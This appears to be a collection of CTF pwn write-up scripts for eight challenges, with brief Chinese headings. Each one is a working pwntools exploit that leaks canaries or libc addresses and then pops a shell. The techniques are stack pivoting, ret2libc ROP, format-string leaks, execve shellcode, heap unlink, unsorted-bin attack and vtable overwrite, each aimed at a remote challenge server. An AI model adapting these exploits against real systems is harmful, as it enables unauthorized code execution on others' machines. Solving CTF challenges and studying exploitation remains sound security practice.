# bllhl_mom

简单的32位栈迁移

```Python
from pwn import *
from wstube import websocket
import sys

context(arch='i386', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './bllhl_mom'
libc_path = './'
port = 0000
if local:
    p = process(elf_path)
else:
    ip, port = '1.95.36.136:2108'.split(':')
    p = remote(ip, port)
    # p = websocket()

def debug():
    if local:
        gdb.attach(p, '''
            b* main
        ''')

# /bin/sh - %23$p
elf = ELF(elf_path)
system = elf.symbols['system']
leave_ret = 0x80486e1

p.sendafter(b'to Mom', b'%23$p')
canary = int(p.recv(10), 16)
log.info('canary: ' + hex(canary))

payload = 'b' * 4 * 8
debug()
p.send(payload)
p.recvuntil(b'b' * 0x20)
stack = u32(p.recv(4)) - 0x60
log.info('stack: ' + hex(stack))
pause()
payload = flat([
    0,
    system,
    0,
    stack+0x4*5,0,
    '/bin/sh\x00',
    'a'*4*10,
    canary,
    0,0,
    stack,
    leave_ret,
])
p.send(payload)

p.interactive()
```

# koi

ret2libc

```Python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './koi'
libc_path = './'
port = 0000
if local:
    p = process(elf_path)
else:
    ip, port = '1.95.36.136:2134'.split(':')
    p = remote(ip, port)
    # p = websocket()

def debug():
    if local:
        gdb.attach(p, '''
            b* 0x400836
            b* xxx
        ''')

def choose(idx):
    p.sendlineafter(b'3.exif', str(idx).encode())

def wrshell(number, size, sehll):
    choose(1)
    p.sendlineafter(b'number:', number)
    p.sendlineafter(b'size:', size)
    p.sendlineafter(b'sehll:', sehll)

elf = ELF(elf_path)
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
n = 0x60108c
xxx = 0x4009ce
pop_rdi = 0x400a63
ret = 0x4005d9

payload = b'a' * 0x50 + p64(n + 0x4)
wrshell(b'0', b'0', payload)
p.sendlineafter(b'Enter a:', b'520')
p.recvuntil(b'CTF!\n\n')
payload = b'a' * (0x50 + 0x8) + p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(xxx)
p.sendline(payload)
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info('puts_addr: ' + hex(puts_addr))
# from LibcSearcher import LibcSearcher
# libc = LibcSearcher('puts', puts_addr)
# libc 2.23 ubuntu11.3
# libc_base = puts_addr - libc.dump('puts')
# libc_system = libc_base + libc.dump('system')
# libc_binsh = libc_base + libc.dump('str_bin_sh')v
libc_base = puts_addr - 0x6f6a0
libc_system = libc_base + 0x453a0
libc_binsh = libc_base + 0x18ce57

debug()
payload = b'a' * (0x50 + 0x8) + p64(pop_rdi) + p64(libc_binsh) + p64(libc_system)
p.recvuntil(b'CTF!\n')
p.sendline(payload)

p.interactive()
```

# Libc

32位ret2libc

```Python
from pwn import *
from wstube import websocket
import sys

context(arch='i386', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './libc'
libc_path = './libc.so.6'
port = 0000
if local:
    p = process(elf_path)
else:
    ip, port = '1.95.36.136:2121'.split(':')
    p = remote(ip, port)
    # p = websocket()

def debug():
    if local:
        gdb.attach(p, '''
            b* jiu
        ''')

elf = ELF(elf_path)
# libc = ELF(libc_path)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
jiu = elf.symbols['jiu']
payload = b'a' * (0x3a + 0x4) + p32(puts_plt) + p32(jiu) + p32(puts_got)
debug()
p.sendlineafter(b'like\n', payload)
puts_addr = u32(p.recv(4))
print('puts_addr:', hex(puts_addr))
from LibcSearcher import LibcSearcher
libc_searcher = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc_searcher.dump('puts')
system_addr = libc_base + libc_searcher.dump('system')
binsh_addr = libc_base + libc_searcher.dump('str_bin_sh')
# libc_base = puts_addr - libc.symbols['puts']
# system_addr = libc_base + libc.symbols['system']
# binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
payload = b'a' * (0x3a + 0x4) + p32(system_addr) + p32(0) + p32(binsh_addr)
p.recvuntil(b'like\n')
p.sendline(payload)

p.interactive()
```

# fmt_text

简单的格式化字符串漏洞+32位栈溢出

```Python
from pwn import *
from wstube import websocket
import sys

context(arch='i386', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './fmt_text'
libc_path = '/home/lh/pwn-tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6'
if local:
    p = process(elf_path)
else:
    ip, port = '1.95.36.136:2068'.split(':')
    p = remote(ip, port)
    # p = websocket()

def debug():
    if local:
        gdb.attach(p, '''
            b* 0x804863a
        ''')

libc = ELF(libc_path)
elf = ELF(elf_path)
system_plt = elf.symbols['system']
gets_plt = elf.plt['gets']
bss = 0x804a080
payload = b'%31$p%23$p%39$p'
p.sendline(payload)
pause()
canary = int(p.recv(10), 16)
stack = int(p.recv(10), 16)
__libc_start_main = int(p.recv(10), 16) - 247
print('canary:', hex(canary))
print('stack:', hex(stack))
debug()
# payload = b'/bin/sh\x00' + b'\x00' * 0x5c + p32(canary) + p32(0)*3 + p32(system) + p32(0) + p32(binsh)
payload = b'\x00' * 0x64 + p32(canary) + p32(0)*3 + p32(gets_plt) + p32(system_plt) + p32(bss) + p32(bss) + p32(bss)
p.sendline(payload)
pause()
p.sendline(b'/bin/sh\x00')
p.interactive()
```

# bllbl_shellcode_2

shellcode构造题

```Python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = True if args[0] == None else False
elf_path = './bllbl_shellcode_2'
libc_path = './'
port = 0000
if local:
    p = process(elf_path)
else:
    ip, port = '1.95.36.136:2070'.split(':')
    p = remote(ip, port)
    # p = websocket()

def debug():
    if local:
        gdb.attach(p, '''
            b* yichu
        ''')

leave_ret = 0x401286
mov_rbp_rsp_jmp_rsp = 0x40137d
make_bss = 0x401216
jmp_rsp = 0x401380
binsh = 0x402047

shellcode = asm('''
    mov al, 0x3b
    xor edx, edx
    xor esi, esi
    mov edi, 0x402047
    syscall
''').ljust(0x5 + 0x8, b'\x00')

payload = shellcode + p64(jmp_rsp)
payload += asm('''
    sub rsp, 0x15
    jmp rsp
''')
debug()
p.send(payload)

p.interactive()
```

# bll_ezheap1

unlink修改list

```Python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './libc.so.6'
port = 0000
if local:
    p = process(elf_path)
else:
    ip, port = '1.95.36.136:2140'.split(':')
    p = remote(ip, port)
    # p = websocket()

def debug():
    if local:
        gdb.attach(p, '''
            b* add_chunk
            b* edit_chunk
            b* delete_chunk
        ''')

def choose(idx):
    p.sendlineafter(b'choice:', str(idx).encode())

def add(index, size):
    choose(1)
    p.sendlineafter(b'index:', str(index).encode())
    p.sendlineafter(b'size:', str(size).encode())

def edit(index, length, content):
    choose(2)
    p.sendlineafter(b'index:', str(index).encode())
    p.sendlineafter(b'length:', str(length).encode())
    p.send(content)

def delete(index):
    choose(3)
    p.sendlineafter(b'index:', str(index).encode())

elf = ELF(elf_path)
libc = ELF(libc_path)

choose(5)
p.recvuntil(b'key:')
key = int(p.recv(14), 16)
log.info('key: ' + hex(key))
add(0, 0x40)
add(1, 0x80)
add(2, 0x80)
add(3, 0x20)
ptr = key + 0x14
fd = ptr - 0x18
bk = ptr - 0x10
payload = p64(0) + p64(0x41) + p64(fd) + p64(bk)
payload += p64(0) * 4 + p64(0x40) + p64(0x90) 
edit(0, len(payload), payload)
delete(1)

payload = b'\x00' * 4 + p64(0xabcdef)
edit(0, len(payload), payload)
debug()
choose(5)

p.interactive()
```

# Thinks

标准的unsorted bin attack任意写一个大数

```Python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './'
port = 0000
if local:
    p = process(elf_path)
else:
    ip, port = '1.95.36.136:2075'.split(':')
    p = remote(ip, port)
    # p = websocket()

def debug():
    if local:
        gdb.attach(p, '''
            b* main
            b* create_blessing
            b* edit_blessing
            b* delete_blessing
            b* wish
        ''')

def chosen(idx):
    p.sendlineafter(b'choice :', str(idx).encode())

def create(size, content):
    chosen(1)
    p.sendlineafter(b'blessing : ', str(size).encode())
    p.sendlineafter(b'blessing:', content)

def edit(idx, size, content):
    chosen(2)
    p.sendlineafter(b'Index :', str(idx).encode())
    p.sendlineafter(b'blessing : ', str(size).encode())
    p.sendlineafter(b'blessing : ', content)

def delete(idx):
    chosen(3)
    p.sendlineafter(b'Index :', str(idx).encode())

magic = 0x6020c0
create(0x20, b'a' * 0x20) #1
create(0x80, b'b' * 0x80) #2
create(0x80, b'c' * 0x80) #3
delete(1)
debug()
payload = b'\x00' * 0x20 + p64(0) + p64(0x91)
payload += p64(0) + p64(magic - 0x10)
edit(0, len(payload), payload)
create(0x80, b'c' * 0x80) #4
chosen(0x145c)
p.interactive()
```

# Garden

c++堆题，虚函数覆盖

```Python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './garden'
libc_path = './'
port = 0000
if local:
    p = process(elf_path)
else:
    ip, port = '1.95.36.136:2112'.split(':')
    p = remote(ip, port)
    # p = websocket()

def debug():
    if local:
        gdb.attach(p, '''
            b* main
            b* addRose
            b* addDandelion
            b* 0x4017ec
            b* showinfo
            b* remove
        ''')

def choose(idx):
    p.sendlineafter(b'choice :', str(idx).encode())

def addRose(name, weight):
    choose(1)
    p.sendlineafter(b'Name : ', name)
    p.sendlineafter(b'Weight : ', weight)

def addDandelion(name, weight):
    choose(2)
    p.sendlineafter(b'Name : ', name)
    p.sendlineafter(b'Weight : ', weight)

def listen(index):
    choose(3)
    p.sendlineafter(b'Plant : ', str(index).encode())

def show(index):
    choose(4)
    p.sendlineafter(b'Plant : ', str(index).encode())

def remove(index):
    choose(5)
    p.sendlineafter(b'Plant : ', str(index).encode())

name = 0x605420
p.recvuntil(b'Name of Your zoo :')
p.send(b'aaaaaaaa' + p64(name + 0x10) + asm(shellcraft.sh()))
addRose(b'1' * 0x8, b'0')
addRose(b'2' * 0x8, b'1')
remove(0)
# addRose(b'3' * 0x20 + p64(0x31) + p64(name), b'15')
debug()
addRose(b'3' * 0x48 + p64(name + 8), b'2')
listen(0)

p.interactive()
```